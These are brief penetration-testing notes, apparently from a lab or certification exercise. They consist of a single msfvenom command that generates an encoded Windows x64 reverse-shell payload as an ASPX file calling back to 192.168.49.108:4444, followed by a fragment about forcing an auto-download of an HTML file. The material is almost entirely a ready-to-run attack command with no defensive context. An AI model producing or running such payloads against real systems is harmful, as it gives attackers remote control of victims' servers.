test.aspx

msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LPORT=4444 LHOST=192.168.49.108 -f aspx -e x64/zutto_dekiru -i 5 -o test.aspx

test.html

Force auto download